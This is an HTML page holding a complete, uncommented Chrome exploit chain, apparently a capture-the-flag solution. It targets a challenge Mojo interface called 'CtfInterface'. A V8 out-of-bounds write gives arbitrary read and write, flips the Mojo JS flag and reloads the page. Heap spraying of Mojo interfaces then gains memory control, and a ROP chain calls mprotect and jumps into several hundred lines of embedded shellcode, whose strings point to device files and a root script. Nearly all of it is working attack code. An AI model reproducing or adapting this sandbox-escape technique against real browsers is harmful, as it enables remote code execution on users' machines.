<html>
<script src="./mojo/mojo_bindings.js"></script>
<script src="./mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>
<pre id='log'></pre>
<script>
    function print(string) {
        var log = document.getElementById('log');
        if (log) {
            log.innerText += string + '\n';
        }
    }
    function hex(i) {
        start = "";
        content = i.toString(16);
        if (i < 0) {
            start += "-";
            content = content.substring(1);
        }
        return start + "0x" + content;
    }

</script>
<script type="text/javascript">
    function pwn_v8() {
        print("In v8");
        const uint32 = new Uint32Array([0x1000]);
        oob_access_array = [uint32];
        var f64 = new Float64Array([1.1]);
        uint32.set(uint32, 9);

        var buf = new ArrayBuffer(8);
        var f64_buf = new Float64Array(buf);
        var u64_buf = new Uint32Array(buf);

        function ftoi(val) {
            f64_buf[0] = val;
            return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
        }

        function itof(val) {
            u64_buf[0] = Number(val & 0xffffffffn);
            u64_buf[1] = Number(val >> 32n);
            return f64_buf[0];
        }

        function addrof(in_obj) {
            oob_access_array[0] = in_obj;
            return uint32[0x15];
        }
        function fakeobj(addr) {
            uint32[0x15] = addr;
            return oob_access_array[0];
        }

        var float_array_map = uint32[62];
        if (float_array_map == 0x3ff19999)
            float_array_map = uint32[63];

        var arr2 = [itof(BigInt(float_array_map)), itof(0n), itof(8n), itof(1n), itof(0x1234n), 0, 0].slice();
        var fake = fakeobj(addrof(arr2) - 0x38);
        var v8_heap = BigInt(uint32[12]) << 32n;

        function arbread(addr) {
            arr2[5] = itof(addr);
            return ftoi(fake[0]);
        }

        function arbwrite(addr, val) {
            arr2[5] = itof(addr);
            fake[0] = itof(val);
        }
        var leak = BigInt(addrof(window)) + 0x10n + v8_heap - 1n;
        var chrome_base = arbread(leak) - 0xc1ce730n;
        var mojo_enabled = chrome_base + 0xc560f0en;
        localStorage.setItem("chrome_base", chrome_base);
        arbwrite(mojo_enabled, 1n);
        window.location.reload();
    }



</script>
<script type="text/javascript">
    arb = new ArrayBuffer(8);
    f64 = new Float64Array(arb);
    B64 = new BigInt64Array(arb);

    function ftoi(f) {
        f64[0] = f;
        return B64[0];
    }

    function itof(i) {
        B64[0] = i;
        return f64[0];
    }

    function pwn_sbx() {
        print('In sbx!');
        (async function pwn() {
            A = [];
            B = [];
            let i = 0;
            for (i = 0; i < 0x1000; i++) {
                A.push(null);
                A[i] = new blink.mojom.CtfInterfacePtr();
                Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(A[i]).handle);
            }
            for (i = 0; i < 0x1000; i++) {
                A[i].ptr.reset();
            }
            for (i = 0; i < 0x1000; i++) {
                B.push(null);
                B[i] = new blink.mojom.CtfInterfacePtr();
                Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(B[i]).handle);
                B[i].resizeVector(0x4);
            }
            for (i = 0; i < 0x1000; i++) {
                await B[i].write(itof(BigInt(i)), 0);
            }

            var vtable = (await B[0].read(4)).value;
            var heap1 = (await B[0].read(5)).value;
            var heap2 = (await B[0].read(6)).value;

            vtable = ftoi(vtable);
            heap1 = ftoi(heap1);
            heap2 = ftoi(heap2);
            if ((heap1 + 0x20n == heap2) && ((vtable & 0xfffn) == 0x4e0n)) { // pass check !
                print("OK!");
                print(hex(vtable));
                print(hex(heap1));
                print(hex(heap2));
            } else { // failed !
                window.location.reload();
            }

            // Now B[0] can control B[2]'s data pointer by setting B[0].Write(xxx, 5)
            async function aaw(address, value) {
                await B[0].write(itof(address), 5);
                await B[2].write(itof(value), 0);
            }

            async function aar(address) {
                await B[0].write(itof(address), 5);
                var v = (await B[2].read(0)).value;
                return ftoi(v);
            }

            //var chrome_base = BigInt(localStorage.getItem("chrome_base")); // NOT WORKING @_@?
            var chrome_base = vtable - 0xbc774e0n; // get chrome base address
            var chrome_base_rop = chrome_base + 0x33c9000n; // chrome base for ROP gadget 
            xchg_rax_rsp = chrome_base_rop + 0x8f0e18n; // xchg rax, rsp; add cl, byte ptr [rax - 0x77]; ret;
            pop1 = chrome_base_rop + 0x29ddebn; // pop r12; ret
            pop_rax = chrome_base_rop + 0x50404n; //pop rax; ret;
            pop_rsi = chrome_base_rop + 0xc5daen; // pop rsi; ret;
            pop_rdx = chrome_base_rop + 0x28c332n;// pop rdx; ret; 
            pop_rdi = chrome_base_rop + 0x20b45dn;//  pop rdi; ret; 
            syscall_ret = chrome_base + 0x800dd77n; // syscall; ret;
            jmp_rax = chrome_base_rop + 0xbcfn; // jmp rax;

            /* Our ROP chain */
            await B[2].write(itof(pop1), 0); // ROP will start from here
            await B[2].write(itof(xchg_rax_rsp), 1); // vtable will jump to here
            await B[2].write(itof(pop_rax), 2); // pop rax
            await B[2].write(itof(10n), 3); // rax = 10 ( mprotect's syscall number )
            await B[2].write(itof(pop_rdx), 4); // pop rdx
            await B[2].write(itof(7n), 5); // rdx = 7 ( PROT = rwx )
            await B[2].write(itof(pop_rsi), 6); // pop rsi
            await B[2].write(itof(0x2000n), 7); // rsi = 0x2000
            await B[2].write(itof(pop_rdi), 8); // pop rdi
            await B[2].write(itof((heap1 & (~0xfffn))), 9); // rdi = heap1 & (~0xfff)
            await B[2].write(itof(syscall_ret), 10); // do syscall ( mprotect(heap1 & ~0xfff, 0x2000, 7) )
            await B[2].write(itof(pop_rax), 11); // pop rax
            await B[2].write(itof(heap1 + 0x100n), 12); // rax = heap1 + 0x100
            await B[2].write(itof(jmp_rax), 13); // jmp to RAX ( B[2] index 32, our shellcode )

            /* Our shellcode */
            //await B[2].write(itof(0xfeebn), 32); // loop
            //await B[2].write(itof(shellcode in BigInt), 33); 
            //await B[2].write(itof(shellcode in BigInt), 34); 
            //.............. 
await B[2].write(itof(0x68ec8148fa1e0ff3n), 32);
await B[2].write(itof(0x15c2484c7000001n), 33);
await B[2].write(itof(0x3aeb000000000000n), 34);
await B[2].write(itof(0x3d8d4800000002ben), 35);
await B[2].write(itof(0xb8000007ecn), 36);
await B[2].write(itof(0x948b0000045ce800n), 37);
await B[2].write(itof(0xd263480000015c24n), 38);
await B[2].write(itof(0x950c8d48n), 39);
await B[2].write(itof(0x8900000bb9158d48n), 40);
await B[2].write(itof(0x15c2484831104n), 41);
await B[2].write(itof(0x15c24bc810100n), 42);
await B[2].write(itof(0xc7b97e000000ff00n), 43);
await B[2].write(itof(0x01582484n), 44);
await B[2].write(itof(0x5824848b2aeb0000n), 45);
await B[2].write(itof(0x148d489848000001n), 46);
await B[2].write(itof(0x58d480000000085n), 47);
await B[2].write(itof(0x8902048b00000b7cn), 48);
await B[2].write(itof(0x84830000038de8c7n), 49);
await B[2].write(itof(0xbc81010000015824n), 50);
await B[2].write(itof(0xff0000015824n), 51);
await B[2].write(itof(0x2bec97e00n), 52);
await B[2].write(itof(0xb8000007513d8d48n), 53);
await B[2].write(itof(0x3d1e800000000n), 54);
await B[2].write(itof(0x14c24848900n), 55);
await B[2].write(itof(0xba0000014c24848bn), 56);
await B[2].write(itof(0x539be000002c0n), 57);
await B[2].write(itof(0xb8c78900n), 58);
await B[2].write(itof(0x4c8d480000034fe8n), 59);
await B[2].write(itof(0x14c24848b2024n), 60);
await B[2].write(itof(0x894800000100ba00n), 61);
await B[2].write(itof(0x40be8c789cen), 62);
await B[2].write(itof(0x8489482024448d48n), 63);
await B[2].write(itof(0x848b480000014024n), 64);
await B[2].write(itof(0xc083480000014024n), 65);
await B[2].write(itof(0x45e02d48008b4818n), 66);
await B[2].write(itof(0x138248489480207n), 67);
await B[2].write(itof(0x14c24848b0000n), 68);
await B[2].write(itof(0x3abe00000000ba00n), 69);
await B[2].write(itof(0xb8c789000005n), 70);
await B[2].write(itof(0x8b000002ede80000n), 71);
await B[2].write(itof(0x10ba0000014c2484n), 72);
await B[2].write(itof(0x539be000000n), 73);
await B[2].write(itof(0xe800000000b8c789n), 74);
await B[2].write(itof(0x4c24848b000002d0n), 75);
await B[2].write(itof(0xba000001n), 76);
await B[2].write(itof(0xb8c7890000053aben), 77);
await B[2].write(itof(0x2b3e800000000n), 78);
await B[2].write(itof(0x1542484c700n), 79);
await B[2].write(itof(0x2be3aeb00000000n), 80);
await B[2].write(itof(0x66e3d8d48000000n), 81);
await B[2].write(itof(0xe800000000b80000n), 82);
await B[2].write(itof(0x5424948b000002een), 83);
await B[2].write(itof(0x8d48d26348000001n), 84);
await B[2].write(itof(0x8d4800000000950cn), 85);
await B[2].write(itof(0x11048900000a4b15n), 86);
await B[2].write(itof(0x100000154248483n), 87);
await B[2].write(itof(0xff0000015424bc81n), 88);
await B[2].write(itof(0x2484c7b97e000000n), 89);
await B[2].write(itof(0x00000150n), 90);
await B[2].write(itof(0x15024848b43ebn), 91);
await B[2].write(itof(0x8908e0c101c08300n), 92);
await B[2].write(itof(0x15024848bc2n), 93);
await B[2].write(itof(0x850c8d489848n), 94);
await B[2].write(itof(0x9ff058d480000n), 95);
await B[2].write(itof(0x539be01048b00n), 96);
await B[2].write(itof(0xb8c78900n), 97);
await B[2].write(itof(0x24848300000217e8n), 98);
await B[2].write(itof(0x24bc810100000150n), 99);
await B[2].write(itof(0xff00000150n), 100);
await B[2].write(itof(0x8b20244c8d48b07en), 101);
await B[2].write(itof(0x10ba0000014c2484n), 102);
await B[2].write(itof(0xc789ce8948000000n), 103);
await B[2].write(itof(0x848b48000002bee8n), 104);
await B[2].write(itof(0xc083480000014024n), 105);
await B[2].write(itof(0x8e8c148008b4808n), 106);
await B[2].write(itof(0x13424848901e883n), 107);
await B[2].write(itof(0x13824848b480000n), 108);
await B[2].write(itof(0x244dd4005480000n), 109);
await B[2].write(itof(0x44c7481024448948n), 110);
await B[2].write(itof(0x8d48000001001824n), 111);
await B[2].write(itof(0x14c24848b10244cn), 112);
await B[2].write(itof(0x4800000010ba0000n), 113);
await B[2].write(itof(0x24fe8c789ce89n), 114);
await B[2].write(itof(0x6d742f092444c700n), 115);
await B[2].write(itof(0x782f0d2444c76670n), 116);
await B[2].write(itof(0x24848b000f2444c6n), 117);
await B[2].write(itof(0x8d48984800000134n), 118);
await B[2].write(itof(0x8d48000000008514n), 119);
await B[2].write(itof(0x2048b0000093b05n), 120);
await B[2].write(itof(0x7ba09244c8d48n), 121);
await B[2].write(itof(0xe8c789ce89480000n), 122);
await B[2].write(itof(0x24448d480000020cn), 123);
await B[2].write(itof(0x41be000001ffba09n), 124);
await B[2].write(itof(0xb8c78948000000n), 125);
await B[2].write(itof(0x192e8000000n), 126);
await B[2].write(itof(0x8b00000130248489n), 127);
await B[2].write(itof(0x23ba000001302484n), 128);
await B[2].write(itof(0x50e358d48000000n), 129);
await B[2].write(itof(0x1cfe8c7890000n), 130);
await B[2].write(itof(0x13024848b00n), 131);
await B[2].write(itof(0xba000000f4e8c789n), 132);
await B[2].write(itof(0x41be000001ffn), 133);
await B[2].write(itof(0x5103d8d4800n), 134);
await B[2].write(itof(0x148e800000000b8n), 135);
await B[2].write(itof(0x12c2484890000n), 136);
await B[2].write(itof(0x12c24848b00n), 137);
await B[2].write(itof(0x358d4800000005ban), 138);
await B[2].write(itof(0x85e8c789000004e7n), 139);
await B[2].write(itof(0x12c24848b000001n), 140);
await B[2].write(itof(0xaae8c7890000n), 141);
await B[2].write(itof(0xbe00000000ba00n), 142);
await B[2].write(itof(0x4c63d8d48000000n), 143);
await B[2].write(itof(0xbe00000078e80000n), 144);
await B[2].write(itof(0xbd3d8d4800000000n), 145);
await B[2].write(itof(0xb8000004n), 146);
await B[2].write(itof(0x248489000000ede8n), 147);
await B[2].write(itof(0x244c8d4800000128n), 148);
await B[2].write(itof(0x12824848b20n), 149);
await B[2].write(itof(0xce894800000100ban), 150);
await B[2].write(itof(0x4800000144e8c789n), 151);
await B[2].write(itof(0x100ba2024448dn), 152);
await B[2].write(itof(0x1bfc6894800n), 153);
await B[2].write(itof(0xbf00000112e800n), 154);
await B[2].write(itof(0xb8000000n), 155);
await B[2].write(itof(0x81489000000009e8n), 156);
await B[2].write(itof(0xff3c300000168c4n), 157);
await B[2].write(itof(0x3cb8fc247c89fa1en), 158);
await B[2].write(itof(0xf3c390050f000000n), 159);
await B[2].write(itof(0xf8247c8948fa1e0fn), 160);
await B[2].write(itof(0x548948f024748948n), 161);
await B[2].write(itof(0xf0000003bb8e824n), 162);
await B[2].write(itof(0x89fa1e0ff3c39005n), 163);
await B[2].write(itof(0x3b8fc247cn), 164);
await B[2].write(itof(0xfa1e0ff3c390050fn), 165);
await B[2].write(itof(0x94247c8950ec8348n), 166);
await B[2].write(itof(0x5489488824748948n), 167);
await B[2].write(itof(0x4cb0244c8948a824n), 168);
await B[2].write(itof(0x244c894cb8244489n), 169);
await B[2].write(itof(0x44290f2874c084c0n), 170);
await B[2].write(itof(0xfd8244c290fc824n), 171);
await B[2].write(itof(0x245c290fe8245429n), 172);
await B[2].write(itof(0x290f082464290ff8n), 173);
await B[2].write(itof(0x282474290f18246cn), 174);
await B[2].write(itof(0x10b838247c290fn), 175);
await B[2].write(itof(0xc4834890050f0000n), 176);
await B[2].write(itof(0x8348fa1e0ff3c350n), 177);
await B[2].write(itof(0x8990247c894850ecn), 178);
await B[2].write(itof(0xa8245489488c2474n), 179);
await B[2].write(itof(0x44894cb0244c8948n), 180);
await B[2].write(itof(0x84c0244c894cb824n), 181);
await B[2].write(itof(0xc82444290f2874c0n), 182);
await B[2].write(itof(0x54290fd8244c290fn), 183);
await B[2].write(itof(0xff8245c290fe824n), 184);
await B[2].write(itof(0x246c290f08246429n), 185);
await B[2].write(itof(0x290f282474290f18n), 186);
await B[2].write(itof(0x2b838247cn), 187);
await B[2].write(itof(0xc350c4834890050fn), 188);
await B[2].write(itof(0xfc247c89fa1e0ff3n), 189);
await B[2].write(itof(0x548948f024748948n), 190);
await B[2].write(itof(0xf00000001b8e824n), 191);
await B[2].write(itof(0x89fa1e0ff3c39005n), 192);
await B[2].write(itof(0xf024748948fc247cn), 193);
await B[2].write(itof(0xb8e824548948n), 194);
await B[2].write(itof(0xff3c390050f0000n), 195);
await B[2].write(itof(0x7489fc247c89fa1en), 196);
await B[2].write(itof(0xf00000021b8f824n), 197);
await B[2].write(itof(0x00c39005n), 198);
await B[2].write(itof(0x00000000n), 199);
await B[2].write(itof(0x00000000n), 200);
await B[2].write(itof(0x00000000n), 201);
await B[2].write(itof(0x00000000n), 202);
await B[2].write(itof(0x00000000n), 203);
await B[2].write(itof(0x00000000n), 204);
await B[2].write(itof(0x00000000n), 205);
await B[2].write(itof(0x00000000n), 206);
await B[2].write(itof(0x00000000n), 207);
await B[2].write(itof(0x00000000n), 208);
await B[2].write(itof(0x00000000n), 209);
await B[2].write(itof(0x00000000n), 210);
await B[2].write(itof(0x00000000n), 211);
await B[2].write(itof(0x00000000n), 212);
await B[2].write(itof(0x00000000n), 213);
await B[2].write(itof(0x00000000n), 214);
await B[2].write(itof(0x00000000n), 215);
await B[2].write(itof(0x00000000n), 216);
await B[2].write(itof(0x00000000n), 217);
await B[2].write(itof(0x00000000n), 218);
await B[2].write(itof(0x00000000n), 219);
await B[2].write(itof(0x00000000n), 220);
await B[2].write(itof(0x00000000n), 221);
await B[2].write(itof(0x00000000n), 222);
await B[2].write(itof(0x00000000n), 223);
await B[2].write(itof(0x00000000n), 224);
await B[2].write(itof(0x00000000n), 225);
await B[2].write(itof(0x00000000n), 226);
await B[2].write(itof(0x00000000n), 227);
await B[2].write(itof(0x00000000n), 228);
await B[2].write(itof(0x00000000n), 229);
await B[2].write(itof(0x00000000n), 230);
await B[2].write(itof(0x00000000n), 231);
await B[2].write(itof(0x00000000n), 232);
await B[2].write(itof(0x00000000n), 233);
await B[2].write(itof(0x00000000n), 234);
await B[2].write(itof(0x00000000n), 235);
await B[2].write(itof(0x00000000n), 236);
await B[2].write(itof(0x00000000n), 237);
await B[2].write(itof(0x00000000n), 238);
await B[2].write(itof(0x00000000n), 239);
await B[2].write(itof(0x00000000n), 240);
await B[2].write(itof(0x00000000n), 241);
await B[2].write(itof(0x00000000n), 242);
await B[2].write(itof(0x00000000n), 243);
await B[2].write(itof(0x00000000n), 244);
await B[2].write(itof(0x00000000n), 245);
await B[2].write(itof(0x00000000n), 246);
await B[2].write(itof(0x00000000n), 247);
await B[2].write(itof(0x00000000n), 248);
await B[2].write(itof(0x00000000n), 249);
await B[2].write(itof(0x00000000n), 250);
await B[2].write(itof(0x00000000n), 251);
await B[2].write(itof(0x00000000n), 252);
await B[2].write(itof(0x00000000n), 253);
await B[2].write(itof(0x00000000n), 254);
await B[2].write(itof(0x00000000n), 255);
await B[2].write(itof(0x00000000n), 256);
await B[2].write(itof(0x00000000n), 257);
await B[2].write(itof(0x00000000n), 258);
await B[2].write(itof(0x00000000n), 259);
await B[2].write(itof(0x00000000n), 260);
await B[2].write(itof(0x00000000n), 261);
await B[2].write(itof(0x00000000n), 262);
await B[2].write(itof(0x00000000n), 263);
await B[2].write(itof(0x00000000n), 264);
await B[2].write(itof(0x00000000n), 265);
await B[2].write(itof(0x00000000n), 266);
await B[2].write(itof(0x00000000n), 267);
await B[2].write(itof(0x00000000n), 268);
await B[2].write(itof(0x00000000n), 269);
await B[2].write(itof(0x00000000n), 270);
await B[2].write(itof(0x00000000n), 271);
await B[2].write(itof(0x00000000n), 272);
await B[2].write(itof(0x00000000n), 273);
await B[2].write(itof(0x00000000n), 274);
await B[2].write(itof(0x00000000n), 275);
await B[2].write(itof(0x00000000n), 276);
await B[2].write(itof(0x00000000n), 277);
await B[2].write(itof(0x00000000n), 278);
await B[2].write(itof(0x00000000n), 279);
await B[2].write(itof(0x00000000n), 280);
await B[2].write(itof(0x00000000n), 281);
await B[2].write(itof(0x00000000n), 282);
await B[2].write(itof(0x00000000n), 283);
await B[2].write(itof(0x00000000n), 284);
await B[2].write(itof(0x00000000n), 285);
await B[2].write(itof(0x00000000n), 286);
await B[2].write(itof(0x00000000n), 287);
await B[2].write(itof(0x6674632f7665642fn), 288);
await B[2].write(itof(0x00000000n), 289);
await B[2].write(itof(0x6d74702f7665642fn), 290);
await B[2].write(itof(0x00000078n), 291);
await B[2].write(itof(0x622f6e69622f2123n), 292);
await B[2].write(itof(0x207461630a687361n), 293);
await B[2].write(itof(0x6264762f7665642fn), 294);
await B[2].write(itof(0x6f722f706d742f3en), 295);
await B[2].write(itof(0xffffffff00746fn), 296);
await B[2].write(itof(0x792f706d742fn), 297);
await B[2].write(itof(0x6f6f722f706d742fn), 298);
await B[2].write(itof(0x00000074n), 299);
await B[2].write(itof(0x00000000n), 300);
await B[2].write(itof(0x00000000n), 301);
await B[2].write(itof(0x00000000n), 302);
await B[2].write(itof(0x00000000n), 303);
await B[2].write(itof(0x00000000n), 304);
await B[2].write(itof(0x00000000n), 305);
await B[2].write(itof(0x00000000n), 306);
await B[2].write(itof(0x00000000n), 307);
await B[2].write(itof(0x00000000n), 308);
await B[2].write(itof(0x00000000n), 309);
await B[2].write(itof(0x00000000n), 310);
await B[2].write(itof(0x00000000n), 311);
await B[2].write(itof(0x00000000n), 312);
await B[2].write(itof(0x00000000n), 313);
await B[2].write(itof(0x00000000n), 314);
await B[2].write(itof(0x00000000n), 315);
await B[2].write(itof(0x00000000n), 316);
await B[2].write(itof(0x00000000n), 317);
await B[2].write(itof(0x00000000n), 318);
await B[2].write(itof(0x00000000n), 319);
await B[2].write(itof(0x00000000n), 320);
await B[2].write(itof(0x00000000n), 321);
await B[2].write(itof(0x00000000n), 322);
await B[2].write(itof(0x00000000n), 323);
await B[2].write(itof(0x00000000n), 324);
await B[2].write(itof(0x00000000n), 325);
await B[2].write(itof(0x00000000n), 326);
await B[2].write(itof(0x00000000n), 327);
await B[2].write(itof(0x00000000n), 328);
await B[2].write(itof(0x00000000n), 329);
await B[2].write(itof(0x00000000n), 330);
await B[2].write(itof(0x00000000n), 331);
await B[2].write(itof(0x00000000n), 332);
await B[2].write(itof(0x00000000n), 333);
await B[2].write(itof(0x00000000n), 334);
await B[2].write(itof(0x00000000n), 335);
await B[2].write(itof(0x00000000n), 336);
await B[2].write(itof(0x00000000n), 337);
await B[2].write(itof(0x00000000n), 338);
await B[2].write(itof(0x00000000n), 339);
await B[2].write(itof(0x00000000n), 340);
await B[2].write(itof(0x00000000n), 341);
await B[2].write(itof(0x00000000n), 342);
await B[2].write(itof(0x00000000n), 343);
await B[2].write(itof(0x00000000n), 344);
await B[2].write(itof(0x00000000n), 345);
await B[2].write(itof(0x00000000n), 346);
await B[2].write(itof(0x00000000n), 347);
await B[2].write(itof(0x00000000n), 348);
await B[2].write(itof(0x00000000n), 349);
await B[2].write(itof(0x00000000n), 350);
await B[2].write(itof(0x00000000n), 351);
await B[2].write(itof(0x00000000n), 352);
await B[2].write(itof(0x00000000n), 353);
await B[2].write(itof(0x00000000n), 354);
await B[2].write(itof(0x00000000n), 355);
await B[2].write(itof(0x00000000n), 356);
await B[2].write(itof(0x00000000n), 357);
await B[2].write(itof(0x00000000n), 358);
await B[2].write(itof(0x00000000n), 359);
await B[2].write(itof(0x00000000n), 360);
await B[2].write(itof(0x00000000n), 361);
await B[2].write(itof(0x00000000n), 362);
await B[2].write(itof(0x00000000n), 363);
await B[2].write(itof(0x00000000n), 364);
await B[2].write(itof(0x00000000n), 365);
await B[2].write(itof(0x00000000n), 366);
await B[2].write(itof(0x00000000n), 367);
await B[2].write(itof(0x00000000n), 368);
await B[2].write(itof(0x00000000n), 369);
await B[2].write(itof(0x00000000n), 370);
await B[2].write(itof(0x00000000n), 371);
await B[2].write(itof(0x00000000n), 372);
await B[2].write(itof(0x00000000n), 373);
await B[2].write(itof(0x00000000n), 374);
await B[2].write(itof(0x00000000n), 375);
await B[2].write(itof(0x00000000n), 376);
await B[2].write(itof(0x00000000n), 377);
await B[2].write(itof(0x00000000n), 378);
await B[2].write(itof(0x00000000n), 379);
await B[2].write(itof(0x00000000n), 380);
await B[2].write(itof(0x00000000n), 381);
await B[2].write(itof(0x00000000n), 382);
await B[2].write(itof(0x00000000n), 383);
await B[2].write(itof(0x00000000n), 384);
await B[2].write(itof(0x00000000n), 385);
await B[2].write(itof(0x00000000n), 386);
await B[2].write(itof(0x00000000n), 387);
await B[2].write(itof(0x00000000n), 388);
await B[2].write(itof(0x00000000n), 389);
await B[2].write(itof(0x00000000n), 390);
await B[2].write(itof(0x00000000n), 391);
await B[2].write(itof(0x00000000n), 392);
await B[2].write(itof(0x00000000n), 393);
await B[2].write(itof(0x00000000n), 394);
await B[2].write(itof(0x00000000n), 395);
await B[2].write(itof(0x00000000n), 396);
await B[2].write(itof(0x00000000n), 397);
await B[2].write(itof(0x00000000n), 398);
await B[2].write(itof(0x00000000n), 399);
await B[2].write(itof(0x00000000n), 400);
await B[2].write(itof(0x00000000n), 401);
await B[2].write(itof(0x00000000n), 402);
await B[2].write(itof(0x00000000n), 403);
await B[2].write(itof(0x00000000n), 404);
await B[2].write(itof(0x00000000n), 405);
await B[2].write(itof(0x00000000n), 406);
await B[2].write(itof(0x00000000n), 407);
await B[2].write(itof(0x00000000n), 408);
await B[2].write(itof(0x00000000n), 409);
await B[2].write(itof(0x00000000n), 410);
await B[2].write(itof(0x00000000n), 411);
await B[2].write(itof(0x00000000n), 412);
await B[2].write(itof(0x00000000n), 413);
await B[2].write(itof(0x00000000n), 414);
await B[2].write(itof(0x00000000n), 415);
await B[2].write(itof(0x00000000n), 416);
await B[2].write(itof(0x00000000n), 417);
await B[2].write(itof(0x00000000n), 418);
await B[2].write(itof(0x00000000n), 419);
await B[2].write(itof(0x00000000n), 420);
await B[2].write(itof(0x00000000n), 421);
await B[2].write(itof(0x00000000n), 422);
await B[2].write(itof(0x00000000n), 423);
await B[2].write(itof(0x00000000n), 424);
await B[2].write(itof(0x00000000n), 425);
await B[2].write(itof(0x00000000n), 426);
await B[2].write(itof(0x00000000n), 427);
await B[2].write(itof(0x00000000n), 428);
await B[2].write(itof(0x00000000n), 429);
await B[2].write(itof(0x00000000n), 430);
await B[2].write(itof(0x00000000n), 431);
await B[2].write(itof(0x00000000n), 432);
await B[2].write(itof(0x00000000n), 433);
await B[2].write(itof(0x00000000n), 434);
await B[2].write(itof(0x00000000n), 435);
await B[2].write(itof(0x00000000n), 436);
await B[2].write(itof(0x00000000n), 437);
await B[2].write(itof(0x00000000n), 438);
await B[2].write(itof(0x00000000n), 439);
await B[2].write(itof(0x00000000n), 440);
await B[2].write(itof(0x00000000n), 441);
await B[2].write(itof(0x00000000n), 442);
await B[2].write(itof(0x00000000n), 443);
await B[2].write(itof(0x00000000n), 444);
await B[2].write(itof(0x00000000n), 445);
await B[2].write(itof(0x00000000n), 446);
await B[2].write(itof(0x00000000n), 447);
await B[2].write(itof(0x00000000n), 448);
await B[2].write(itof(0x00000000n), 449);
await B[2].write(itof(0x00000000n), 450);
await B[2].write(itof(0x00000000n), 451);
await B[2].write(itof(0x00000000n), 452);
await B[2].write(itof(0x00000000n), 453);
await B[2].write(itof(0x00000000n), 454);
await B[2].write(itof(0x00000000n), 455);
await B[2].write(itof(0x00000000n), 456);
await B[2].write(itof(0x00000000n), 457);
await B[2].write(itof(0x00000000n), 458);
await B[2].write(itof(0x00000000n), 459);
await B[2].write(itof(0x00000000n), 460);
await B[2].write(itof(0x00000000n), 461);
await B[2].write(itof(0x00000000n), 462);
await B[2].write(itof(0x00000000n), 463);
await B[2].write(itof(0x00000000n), 464);
await B[2].write(itof(0x00000000n), 465);
await B[2].write(itof(0x00000000n), 466);
await B[2].write(itof(0x00000000n), 467);
await B[2].write(itof(0x00000000n), 468);
await B[2].write(itof(0x00000000n), 469);
await B[2].write(itof(0x00000000n), 470);
await B[2].write(itof(0x00000000n), 471);
await B[2].write(itof(0x00000000n), 472);
await B[2].write(itof(0x00000000n), 473);
await B[2].write(itof(0x00000000n), 474);
await B[2].write(itof(0x00000000n), 475);
await B[2].write(itof(0x00000000n), 476);
await B[2].write(itof(0x00000000n), 477);
await B[2].write(itof(0x00000000n), 478);
await B[2].write(itof(0x00000000n), 479);
await B[2].write(itof(0x00000000n), 480);
await B[2].write(itof(0x00000000n), 481);
await B[2].write(itof(0x00000000n), 482);
await B[2].write(itof(0x00000000n), 483);
await B[2].write(itof(0x00000000n), 484);
await B[2].write(itof(0x00000000n), 485);
await B[2].write(itof(0x00000000n), 486);
await B[2].write(itof(0x00000000n), 487);
await B[2].write(itof(0x00000000n), 488);
await B[2].write(itof(0x00000000n), 489);
await B[2].write(itof(0x00000000n), 490);
await B[2].write(itof(0x00000000n), 491);
await B[2].write(itof(0x00000000n), 492);
await B[2].write(itof(0x00000000n), 493);
await B[2].write(itof(0x00000000n), 494);
await B[2].write(itof(0x00000000n), 495);
await B[2].write(itof(0x00000000n), 496);
await B[2].write(itof(0x00000000n), 497);
await B[2].write(itof(0x00000000n), 498);
await B[2].write(itof(0x00000000n), 499);
await B[2].write(itof(0x00000000n), 500);
await B[2].write(itof(0x00000000n), 501);
await B[2].write(itof(0x00000000n), 502);
await B[2].write(itof(0x00000000n), 503);
await B[2].write(itof(0x00000000n), 504);
await B[2].write(itof(0x00000000n), 505);
await B[2].write(itof(0x00000000n), 506);
await B[2].write(itof(0x00000000n), 507);
await B[2].write(itof(0x00000000n), 508);
await B[2].write(itof(0x00000000n), 509);
await B[2].write(itof(0x00000000n), 510);
await B[2].write(itof(0x00000000n), 511);
await B[2].write(itof(0x00000000n), 512);
await B[2].write(itof(0x00000000n), 513);
await B[2].write(itof(0x00000000n), 514);
await B[2].write(itof(0x00000000n), 515);
await B[2].write(itof(0x00000000n), 516);
await B[2].write(itof(0x00000000n), 517);
await B[2].write(itof(0x00000000n), 518);
await B[2].write(itof(0x00000000n), 519);
await B[2].write(itof(0x00000000n), 520);
await B[2].write(itof(0x00000000n), 521);
await B[2].write(itof(0x00000000n), 522);
await B[2].write(itof(0x00000000n), 523);
await B[2].write(itof(0x00000000n), 524);
await B[2].write(itof(0x00000000n), 525);
await B[2].write(itof(0x00000000n), 526);
await B[2].write(itof(0x00000000n), 527);
await B[2].write(itof(0x00000000n), 528);
await B[2].write(itof(0x00000000n), 529);
await B[2].write(itof(0x00000000n), 530);
await B[2].write(itof(0x00000000n), 531);
await B[2].write(itof(0x00000000n), 532);
await B[2].write(itof(0x00000000n), 533);
await B[2].write(itof(0x00000000n), 534);
await B[2].write(itof(0x00000000n), 535);
await B[2].write(itof(0x00000000n), 536);
await B[2].write(itof(0x00000000n), 537);
await B[2].write(itof(0x00000000n), 538);
await B[2].write(itof(0x00000000n), 539);
await B[2].write(itof(0x00000000n), 540);
await B[2].write(itof(0x00000000n), 541);
await B[2].write(itof(0x00000000n), 542);
await B[2].write(itof(0x00000000n), 543);

	    /* Change B[2]'s vtable and trigger destructor, jump to our ROP chain*/
            await B[0].write(itof(heap1), 4); // change B[2]'s vtable
            await B[2].ptr.reset(); // call [rax+8] == xchg rax, rsp

            print("Done"); // Should never reach here
        })();
    }

</script>
<script>
    if (typeof (Mojo) !== "undefined") {
        // Mojo JS enabled, attack sandbox
        //var chrome_base = BigInt(localStorage.getItem("chrome_base"));
        //print("Chrome base: "+hex(chrome_base));
        pwn_sbx();
    } else {
        // Mojo JS not enabled, enable first
        pwn_v8();
    }
</script>

</html>

